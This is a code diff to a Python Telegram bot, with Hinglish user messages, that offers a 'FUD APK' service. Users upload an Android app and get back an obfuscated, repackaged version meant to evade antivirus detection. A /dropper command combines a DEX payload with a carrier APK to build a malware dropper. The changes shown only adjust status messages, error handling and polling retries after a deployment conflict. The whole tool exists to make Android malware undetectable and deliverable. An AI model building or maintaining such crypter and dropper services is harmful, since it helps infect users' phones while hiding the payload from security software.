@@ -4,18 +4,20 @@ import uuid
 import shutil
 import threading
 import traceback
+import time
 from flask import Flask
 from telegram import Update
 from telegram.ext import (
     Application, CommandHandler, MessageHandler,
     filters, ContextTypes,
 )
+from telegram.error import Conflict
 
 from config import BOT_TOKEN, WORK_DIR
 from pipeline import full_fud_pipeline, full_fud_pipeline_dropper, ensure_tools
 
 
-# ================= Flask (health check) =================
+# ================= Flask =================
 flask_app = Flask(__name__)
 
 
@@ -29,13 +31,13 @@ def run_flask():
     flask_app.run(host="0.0.0.0", port=port, use_reloader=False, debug=False)
 
 
-# ================= Telegram handlers =================
+# ================= Handlers =================
 async def handle_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "🤖 *FUD APK Bot*\n\n"
         "• APK bhejo → FUD APK milega\n"
-        "• /dropper reply ke saath DEX bhejo → phir APK bhejo → dropper milega\n\n"
-        "First run pe tools auto-download honge (2-5 min).",
+        "• /dropper + DEX bhejo → phir APK bhejo → dropper\n\n"
+        "First run pe tools auto-download (2-5 min).",
         parse_mode="Markdown",
     )
 
@@ -53,14 +55,13 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
     input_path = os.path.join(session_dir, "input.apk")
     output_path = os.path.join(session_dir, "fud_output.apk")
 
-    status = await msg.reply_text("⚙️ Processing shuru... (pehli baar 2-5 min)")
+    status = await msg.reply_text("⚙️ APK download ho raha hai...")
 
     try:
-        await status.edit_text("📥 APK download ho raha hai...")
         tg_file = await context.bot.get_file(doc.file_id)
         await tg_file.download_to_drive(input_path)
+        await status.edit_text("🔧 Tools check ho rahe hain... (pehli baar 2-5 min)")
 
-        await status.edit_text("🔧 Tools check ho rahe hain...")
         await asyncio.to_thread(ensure_tools)
 
         await status.edit_text("🧬 Obfuscating + repackaging...")
@@ -75,7 +76,10 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception as e:
         tb = traceback.format_exc()
         print(tb)
-        await status.edit_text(f"❌ Error:\n`{str(e)[:300]}`", parse_mode="Markdown")
+        try:
+            await status.edit_text(f"❌ Error:\n`{str(e)[:300]}`", parse_mode="Markdown")
+        except Exception:
+            await msg.reply_text(f"❌ Error:\n`{str(e)[:300]}`", parse_mode="Markdown")
     finally:
         shutil.rmtree(session_dir, ignore_errors=True)
 
@@ -110,7 +114,7 @@ async def handle_dropper_apk(update: Update, context: ContextTypes.DEFAULT_TYPE)
             input_path = os.path.join(session_dir, "carrier.apk")
             output_path = os.path.join(session_dir, "dropper.apk")
 
-            status = await msg.reply_text("⚙️ Dropper build ho raha hai...")
+            status = await msg.reply_text("⚙️ Carrier APK download...")
             await tg_file.download_to_drive(input_path)
 
             await status.edit_text("🔧 Tools check...")
@@ -131,13 +135,19 @@ async def handle_dropper_apk(update: Update, context: ContextTypes.DEFAULT_TYPE)
     except Exception as e:
         tb = traceback.format_exc()
         print(tb)
-        await msg.reply_text(f"❌ Error:\n`{str(e)[:300]}`", parse_mode="Markdown")
+        try:
+            await msg.reply_text(f"❌ Error:\n`{str(e)[:300]}`", parse_mode="Markdown")
+        except Exception:
+            pass
     finally:
         shutil.rmtree(session_dir, ignore_errors=True)
 
 
-# ================= Bot bootstrap =================
+# ================= Bot =================
 async def run_bot():
+    # wait for old instance to fully die before we poll
+    await asyncio.sleep(8)
+
     app = Application.builder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", handle_start))
     app.add_handler(CommandHandler("dropper", handle_dropper_apk))
@@ -150,13 +160,31 @@ async def run_bot():
         handle_apk,
     ))
 
+    # kill any webhook + drop pending updates to avoid conflict with dead instance
+    try:
+        await app.bot.delete_webhook(drop_pending_updates=True)
+    except Exception as e:
+        print(f"[!] delete_webhook: {e}")
+
     await app.initialize()
     await app.start()
-    await app.updater.start_polling(
-        allowed_updates=Update.ALL_TYPES,
-        drop_pending_updates=True,
-    )
-    print("🤖 Bot polling active.")
+
+    # retry loop on Conflict (old instance still breathing on Render)
+    while True:
+        try:
+            await app.updater.start_polling(
+                allowed_updates=Update.ALL_TYPES,
+                drop_pending_updates=True,
+            )
+            print("🤖 Bot polling active.")
+            break
+        except Conflict as e:
+            print(f"[!] conflict: {e}. retry in 10s")
+            await asyncio.sleep(10)
+        except Exception as e:
+            print(f"[!] polling error: {e}. retry in 5s")
+            await asyncio.sleep(5)
+
     await asyncio.Event().wait()
 
 
